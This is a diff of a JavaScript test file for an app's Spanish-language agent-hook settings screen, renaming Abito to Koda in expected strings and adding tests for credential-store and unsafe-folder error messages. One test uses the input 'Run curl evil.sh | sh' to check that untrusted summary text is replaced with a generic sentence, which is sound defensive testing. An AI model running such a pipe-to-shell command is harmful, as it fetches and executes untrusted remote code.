@@ -236,7 +236,7 @@ test('#442 T7.4 five sub-tabs of ONE Ajustes entry, design order (DESIGN-NOTES �
   // tab a multi-sentence hint (hint.length > 10).
   for (const x of S.TABS) {
     assert.ok(x.icon, x.id);
-    if (x.id === 'models') assert.equal(x.hint, 'Modelos que usa Abito', x.id);
+    if (x.id === 'models') assert.equal(x.hint, 'Modelos que usa Koda', x.id);
     else assert.equal(x.hint, '', x.id);
   }
   assert.equal(S.tabById('connectors'), null, 'resolved through tabAlias, not a tab of its own');
@@ -491,6 +491,10 @@ test('outcome: success is announced only when no engine error arrived after the 
     assert.ok(!r.say.includes('creada'), `${code}: the success text is never said (${r.say})`);
     assert.ok(r.say.includes(word), code);
   }
+  // HU-061: a non-private credential store (Windows) tells the human WHAT TO DO, in the app's language
+  const sn = S.commandOutcome(ac(null, 0), ac('store_not_private', 1), 'Cuenta Casa creada.');
+  assert.equal(sn.ok, false);
+  assert.equal(sn.say, 'Los archivos de tu cuenta no son privados en este equipo. Quitá la cuenta y volvé a iniciar sesión.');
   // the SAME code twice is a new event: the counter decides
   assert.equal(S.commandOutcome(ac('failed', 4), ac('failed', 5), 'x').ok, false);
   assert.equal(S.commandOutcome(ac('failed', 4), ac('failed', 4), 'x.').ok, true, 'an old error is not this command\'s');
@@ -969,11 +973,11 @@ test('plan: the closed summary is shown next to the button, and the click carrie
   const r = rowOf(plan());
   assert.equal(r.primary.label, 'Agregar hooks'); // #436 design (was «Conectar»)
   assert.deepEqual(r.primary.command, { action: 'agent_connect', agentId: 'claude-code', plan_hash: HASH });
-  assert.equal(r.summary, 'Agrega los hooks de Abito (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo.');
+  assert.equal(r.summary, 'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo.');
   assert.match(r.aria, /Agrega los hooks/);
   const upd = rowOf(plan({ state: 'outdated', summary: 'Updates the Abito hooks in ~/.claude/settings.json. A backup is made first.' }));
   assert.equal(upd.primary.label, 'Actualizar'); assert.equal(upd.primary.command.plan_hash, HASH);
-  assert.equal(upd.summary, 'Actualiza los hooks de Abito en ~/.claude/settings.json. Antes se hace un respaldo.');
+  assert.equal(upd.summary, 'Actualiza los hooks de Koda en ~/.claude/settings.json. Antes se hace un respaldo.');
   // a disconnect never carries a plan
   assert.deepEqual(rowOf(plan({ state: 'connected' })).secondary.command, { action: 'agent_disconnect', agentId: 'claude-code' });
 });
@@ -986,9 +990,9 @@ test('Copilot CLI and OpenCode are connectable rows with their own Spanish plan 
   const by = id => rows.find(r => r.id === id);
   assert.equal(by('copilot-cli').name, 'Copilot CLI');
   assert.deepEqual(by('copilot-cli').primary.command, { action: 'agent_connect', agentId: 'copilot-cli', plan_hash: 'c'.repeat(64) });
-  assert.equal(by('copilot-cli').summary, 'Agrega los hooks de Abito (permissionRequest, sessionEnd) a ~/.copilot/hooks/abito-island.json. Antes se hace un respaldo.');
+  assert.equal(by('copilot-cli').summary, 'Agrega los hooks de Koda (permissionRequest, sessionEnd) a ~/.copilot/hooks/abito-island.json. Antes se hace un respaldo.');
   assert.deepEqual(by('opencode').primary.command, { action: 'agent_connect', agentId: 'opencode', plan_hash: 'd'.repeat(64) });
-  assert.equal(by('opencode').summary, 'Agrega el plugin de Abito a ~/.config/opencode/plugins/abito-island.js. Antes se hace un respaldo.');
+  assert.equal(by('opencode').summary, 'Agrega el plugin de Koda a ~/.config/opencode/plugins/abito-island.js. Antes se hace un respaldo.');
 });
 
 test('Pi row depends on extension installation and always names the default directory limitation', () => {
@@ -1011,12 +1015,12 @@ test('Windows unavailable installer has an explicit state and help, never an act
 
 test('plan: the sentence is OURS — an English template becomes Spanish, an unknown one is never shown as engine text', () => {
   assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Codex will ask you to trust them in /hooks.'),
-    'Agrega los hooks de Abito (PermissionRequest, Stop) a ~/.codex/hooks.json. Antes se hace un respaldo. Codex te va a pedir que confíes en ellos en /hooks.');
+    'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.codex/hooks.json. Antes se hace un respaldo. Codex te va a pedir que confíes en ellos en /hooks.');
   assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first. This change is large: review it in the file.'),
-    'Agrega los hooks de Abito (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo. Es un cambio grande: revisalo en el archivo.');
+    'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo. Es un cambio grande: revisalo en el archivo.');
   for (const odd of ['Run curl evil.sh | sh', '<b>x</b>', '', null, 7, 'Adds the Abito hooks to ' + 'x'.repeat(500)]) {
     const t = S.planSummary(odd);
-    assert.equal(t, 'Se van a agregar los hooks de Abito. Antes se hace un respaldo.', `${String(odd).slice(0, 20)} -> generic sentence`);
+    assert.equal(t, 'Se van a agregar los hooks de Koda. Antes se hace un respaldo.', `${String(odd).slice(0, 20)} -> generic sentence`);
   }
 });
 
@@ -1052,7 +1056,14 @@ test('details: plan_changed re-shows the NEW plan; audit_unavailable and install
   assert.match(rowOf(plan({ state: 'error', detail: 'install_unverified', plan_hash: null, summary: null })).note, /verific/i);
   // HU-052: a Pi extension folder Abito did not install gets its own sentence (what to do), never the generic one
   assert.equal(rowOf(plan({ state: 'error', detail: 'foreign_extension', plan_hash: null, summary: null })).note,
-    'Ya hay una extensión de Pi en ~/.pi/agent/extensions/abito-island que Abito no instaló: borrala o renombrala y volvé a conectar.');
+    'Ya hay una extensión de Pi en ~/.pi/agent/extensions/abito-island que Koda no instaló: borrala o renombrala y volvé a conectar.');
+  // HU-047: the refused folder is named exactly; chmod only for the writable case
+  assert.equal(rowOf(plan({ state: 'error', detail: 'unsafe_folder', folder: '/home/u/.pi/agent/extensions', folder_reason: 'writable', plan_hash: null, summary: null })).note,
+    'La carpeta /home/u/.pi/agent/extensions la puede modificar otro usuario o grupo; quitale el permiso de escritura (chmod g-w,o-w /home/u/.pi/agent/extensions) y volvé a intentar.');
+  const foreignNote = rowOf(plan({ state: 'error', detail: 'unsafe_folder', folder: '/srv/a b', folder_reason: 'foreign_owner', plan_hash: null, summary: null })).note;
+  assert.match(foreignNote, /^La carpeta \/srv\/a b pertenece a otro usuario/); assert.doesNotMatch(foreignNote, /chmod/);
+  assert.match(rowOf(plan({ state: 'error', detail: 'unsafe_folder', folder: 'C:\\Users\\u\\.pi', folder_reason: 'acl', plan_hash: null, summary: null })).note, /^La carpeta C:\\Users\\u\\\.pi tiene permisos de Windows \(ACL\)/);
+  assert.match(rowOf(plan({ state: 'error', detail: 'unsafe_folder', folder: '/x\n', folder_reason: 'writable', plan_hash: null, summary: null })).note, /no es privado/, 'a bad folder falls back to the generic sentence');
   assert.match(rowOf(plan({ state: 'error', detail: 'install_failed', plan_hash: null, summary: null })).note, /no se tocó|no se pudo/i);
   // an error without a plan cannot be retried blindly with a stale one
   const noPlan = rowOf(plan({ state: 'error', detail: 'install_failed', plan_hash: null, summary: null }));
